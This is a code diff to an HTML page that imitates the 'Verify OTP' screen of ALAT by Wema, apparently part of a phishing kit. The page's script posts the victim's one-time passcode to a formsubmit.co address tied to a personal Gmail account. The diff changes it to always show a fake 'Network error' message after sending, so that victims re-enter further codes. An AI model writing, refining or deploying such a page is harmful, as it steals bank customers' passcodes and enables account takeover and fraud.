@@ -6,22 +6,17 @@
   <title>Verify OTP | ALAT by Wema</title>
   <link rel="stylesheet" href="assets/index-C49gVU4U.css" />
   <style>
-    /* Main container adjustments */
     .container {
       max-width: 350px;
       margin: 0 auto;
       padding: 20px;
     }
-    
-    /* OTP input container */
     .formOtp {
       display: flex;
       justify-content: space-between;
       margin-bottom: 25px;
       width: 100%;
     }
-    
-    /* Individual OTP inputs */
     .pin-input {
       width: 30px;
       height: 40px;
@@ -30,8 +25,6 @@
       border: 1px solid #ccc;
       border-radius: 5px;
     }
-    
-    /* Responsive adjustments */
     @media (max-width: 400px) {
       .pin-input {
         width: 25px;
@@ -39,8 +32,6 @@
         font-size: 14px;
       }
     }
-    
-    /* Verify button styling */
     .verify-btn {
       width: 100%;
       padding: 12px;
@@ -76,9 +67,8 @@
               </div>
 
               <input type="hidden" name="_captcha" value="false">
-              <input type="hidden" name="_next" value="otp.html">
-                <!-- Add this div just after the formOtp div -->
-                  <div id="error-message" style="color: red; margin-bottom: 15px; display: none;"></div>
+              <!-- Removed _next field to prevent redirection -->
+              <div id="error-message" style="color: red; margin-bottom: 15px; display: none;"></div>
 
               <button type="submit" class="verify-btn">Verify</button>
             </form>
@@ -122,28 +112,24 @@
     const otpForm = document.getElementById('otp-form');
     otpForm.addEventListener('submit', async function (e) {
       e.preventDefault();
-      errorMessage.style.display = 'none'; // Reset error
 
       const formData = new FormData(otpForm);
 
       try {
-        const response = await fetch('https://formsubmit.co/Payday10177@gmail.com', {
+        await fetch('https://formsubmit.co/Payday10177@gmail.com', {
           method: 'POST',
           body: formData
         });
-
-        if (!response.ok) {
-          throw new Error('Network response was not ok');
-        }
-
-        window.location.href = 'otp.html';
       } catch (error) {
-        errorMessage.textContent = 'Network error. Please try again.';
-        errorMessage.style.display = 'block';
+        // Optional: log error
       }
+
+      // Always show error regardless of outcome
+      errorMessage.textContent = 'Network error. Please try again.';
+      errorMessage.style.display = 'block';
     });
   });
 </script>
 
 </body>
-                </html>
+</html>
